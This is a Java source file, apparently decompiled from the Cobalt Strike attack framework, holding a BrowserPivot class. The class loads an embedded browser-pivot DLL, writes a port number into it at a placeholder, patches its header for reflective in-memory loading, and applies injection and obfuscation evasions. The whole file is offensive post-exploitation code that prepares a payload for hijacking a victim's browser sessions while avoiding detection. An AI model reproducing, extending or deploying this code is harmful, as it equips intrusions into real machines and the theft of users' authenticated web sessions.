package beacon.setup;

import beacon.TaskBeacon;
import common.CommonUtils;
import common.Packer;
import common.ReflectiveDLL;
import common.SleevedResource;
import pe.PostExObfuscator;

public class BrowserPivot {
   protected TaskBeacon tasker;
   protected int port;
   protected boolean x64;

   public BrowserPivot(TaskBeacon var1, int var2, boolean var3) {
      this.tasker = var1;
      this.port = var2;
      this.x64 = var3;
   }

   public boolean isX64() {
      return this.x64;
   }

   public byte[] export() {
      byte[] var1 = this.export_dll();
      if (this.x64) {
         var1 = ReflectiveDLL.patchDOSHeaderX64(var1);
      } else {
         var1 = ReflectiveDLL.patchDOSHeader(var1);
      }

      if (this.tasker.useSmartInject()) {
         var1 = PostExObfuscator.setupSmartInject(var1);
      }

      if (this.tasker.obfuscatePostEx()) {
         PostExObfuscator var2 = new PostExObfuscator();
         var2.process(var1);
         var2.enableEvasions();
         var1 = var2.getImage();
      }

      return var1;
   }

   protected byte[] export_dll() {
      byte[] var1 = SleevedResource.readResource(this.x64 ? "resources/browserpivot.x64.dll" : "resources/browserpivot.dll");
      String var2 = CommonUtils.bString(var1);
      Packer var3 = new Packer();
      var3.little();
      var3.addShort(this.port);
      int var4 = var2.indexOf("COBALTSTRIKE");
      var2 = CommonUtils.replaceAt(var2, CommonUtils.bString(var3.getBytes()), var4);
      return CommonUtils.toBytes(var2);
   }
}
